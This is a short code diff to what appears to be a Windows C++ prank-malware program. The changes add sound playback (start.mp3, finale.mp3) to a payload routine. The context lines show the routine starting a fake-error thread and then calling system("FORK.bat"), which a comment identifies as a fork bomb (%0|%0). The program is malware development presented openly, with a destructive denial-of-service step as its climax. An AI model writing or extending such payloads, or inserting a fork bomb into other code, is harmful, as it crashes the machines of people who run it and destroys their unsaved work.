@@ -2,6 +2,11 @@
 #include <windows.h>
 #include <windowsx.h>
 
+#include <Mmsystem.h>
+#include <mciapi.h>
+//these two headers are already included in the <Windows.h> header
+
+
 #include "final.cpp"
 #pragma comment(lib, "winmm.lib")
 
@@ -2170,7 +2175,7 @@ void startPayloads() {
     */
 	HANDLE thread;
 	DWORD ID;
-
+    mciSendString(L"play start.mp3", NULL, 0, NULL);
     //Sleep(random() % 3000 + 2400);
 	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
 	
@@ -2323,7 +2328,8 @@ void startPayloads() {
     Sleep(random() % 4000 + 3000);
 
     // Here is when stuff gets a lil' bit stronger:
-
+    Reset(); // stop bytebeat/""malware" music"
+    mciSendString(L"play finale.mp3", NULL, 0, NULL);
     system("FORK.bat"); // (forkbomb, %0|%0)
     
     
